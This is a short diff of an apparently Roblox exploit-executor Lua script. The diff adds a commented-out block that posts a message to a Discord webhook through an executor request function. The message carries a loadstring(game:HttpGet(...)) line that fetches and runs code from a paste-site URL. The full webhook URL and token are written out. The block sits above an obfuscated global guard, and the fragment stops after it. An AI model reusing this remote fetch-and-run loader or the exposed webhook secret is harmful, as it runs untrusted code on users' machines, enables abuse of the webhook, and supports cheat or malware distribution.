@@ -1,3 +1,11 @@
+--[[
+
+    local HttpService = game:GetService("HttpService"); local Request = http_request or request or (syn and syn.request); local WEBHOOK = "https://discord.com/api/webhooks/1456921374881878193/ZWiYLNX8CL01osj5qgUBcFO8NYcKqXxIvST9XKP3eClOxNtUmkH_9H5eG7TE6nFS2784"; if Request then Request({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode({content = "```loadstring(game:HttpGet(\"https://pastefy.app/tGuaCYCe/raw\"))()```"})}) end
+
+    ]]
+
+
+
 if not _G._30920929389UHIJSSIJSIXIKQJDBWOJ877188172 then
     _G._30920929389UHIJSSIJSIXIKQJDBWOJ877188172 = true
 
